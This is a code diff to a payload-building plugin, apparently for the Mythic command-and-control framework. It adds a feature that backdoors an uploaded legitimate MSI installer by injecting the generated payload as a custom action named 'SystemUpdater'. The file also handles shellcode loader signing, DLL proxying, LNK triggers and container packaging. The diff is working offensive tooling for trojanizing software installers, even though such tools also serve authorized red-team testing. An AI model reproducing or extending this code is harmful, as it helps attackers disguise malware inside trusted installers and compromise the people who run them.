@@ -10,7 +10,7 @@ TODO:
 '''
 from erebus_wrapper.erebus.modules.payload_dll_proxy import generate_proxies
 from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
-from erebus_wrapper.erebus.modules.container_msi import build_msi
+from erebus_wrapper.erebus.modules.container_msi import build_msi, hijack_msi
 from erebus_wrapper.erebus.modules.trigger_lnk import create_payload_trigger
 from erebus_wrapper.erebus.modules.container_archive import build_7z, build_zip
 from erebus_wrapper.erebus.modules.container_iso import build_iso
@@ -445,6 +445,15 @@ generated if none have been entered.""",
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
             ]
         ),
+        BuildParameter(
+            name="5.3 MSI Backdoor File",
+            parameter_type=BuildParameterType.File,
+            description="Backdoor an existing MSI installer by injecting payload execution",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
+            ]
+        ),
         #Codesigning
         BuildParameter(
             name="6.0 Codesign Loader",
@@ -543,6 +552,9 @@ generated if none have been entered.""",
         BuildStep(step_name = "Sign Shellcode Loader",
             step_description = "Signing the Shellcode Loader with a code signing certificate"),
 
+        BuildStep(step_name = "Backdooring MSI",
+                  step_description = "Injecting payload into existing MSI installer"),
+
         BuildStep(step_name = "Adding Trigger",
                   step_description = "Creating trigger to execute given payload"),
 
@@ -552,6 +564,77 @@ generated if none have been entered.""",
         BuildStep(step_name = "Containerising",
                   step_description = "Adding payload into chosen container"),
     ]
+
+    async def backdoor_msi_payload(self):
+        """Backdoors an uploaded MSI installer with the generated payload and places it in the payload directory"""
+        msi_backdoor_uuid = self.get_parameter("5.3 MSI Backdoor File")
+        if not msi_backdoor_uuid:
+            return  # No MSI to backdoor
+        
+        try:
+            # Update build step
+            await SendMythicRPCPayloadUpdatebuildStep(
+                MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Backdooring MSI",
+                StepStdout="Downloading uploaded MSI installer...",
+                StepSuccess=True,
+            ))
+            
+            # Download the uploaded MSI file
+            file_resp = await SendMythicRPCFileGetContent(
+                MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
+            )
+            
+            # Save the MSI to a temporary location
+            temp_dir = Path(tempfile.gettempdir())
+            source_msi_path = temp_dir / f"source_{msi_backdoor_uuid}.msi"
+            source_msi_path.write_bytes(file_resp.Content)
+            
+            await SendMythicRPCPayloadUpdatebuildStep(
+                MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Backdooring MSI",
+                StepStdout="Injecting payload into MSI installer...",
+                StepSuccess=True,
+            ))
+            
+            # Get the payload executable path
+            payload_dir = Path(self.agent_build_path) / "payload"
+            try:
+                payload_exe = next(p for p in payload_dir.iterdir() if p.is_file() and p.suffix.lower() == ".exe")
+            except StopIteration:
+                raise RuntimeError("No .exe payload found in payload directory for MSI backdooring!")
+            
+            # Call hijack_msi to inject the payload
+            backdoored_msi_path = hijack_msi(
+                source_msi=source_msi_path,
+                payload_path=payload_exe,
+                build_path=Path(self.agent_build_path),
+                custom_action_name="SystemUpdater"
+            )
+            
+            # Move the backdoored MSI into the payload directory
+            final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
+            shutil.copy2(backdoored_msi_path, final_msi_path)
+            
+            await SendMythicRPCPayloadUpdatebuildStep(
+                MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Backdooring MSI",
+                StepStdout=f"Successfully backdoored MSI: {final_msi_path.name}",
+                StepSuccess=True,
+            ))
+            
+        except Exception as e:
+            await SendMythicRPCPayloadUpdatebuildStep(
+                MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Backdooring MSI",
+                StepStdout=f"Failed to backdoor MSI: {str(e)}",
+                StepSuccess=False,
+            ))
+            raise RuntimeError(f"MSI backdooring failed: {str(e)}")
 
     async def containerise_payload(self):
         """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
@@ -593,9 +676,9 @@ generated if none have been entered.""",
             case "MSI":
                 return build_msi(
                     build_path=Path(self.agent_build_path),
-                    app_name=self.get_parameter("5.1 MSI Product Name"),
-                    manufacturer=self.get_parameter("5.2 MSI Manufacturer"),
-                    install_scope=self.get_parameter("5.3 MSI Install Scope")
+                    app_name=self.get_parameter("5.0 MSI Product Name"),
+                    manufacturer=self.get_parameter("5.1 MSI Manufacturer"),
+                    install_scope=self.get_parameter("5.2 MSI Install Scope")
                 )
 
         return None
@@ -1414,6 +1497,12 @@ generated if none have been entered.""",
                     return response
 
             ######################### End Of  LNK Trigger Section #########################
+            ######################### MSI Backdooring Section #########################
+            
+            # Backdoor MSI if user uploaded one (adds backdoored MSI to payload directory)
+            await self.backdoor_msi_payload()
+            
+            ######################### End Of MSI Backdooring Section #########################
             ######################### Final Payload / Container #########################
 
             # 1. Capture context for container function
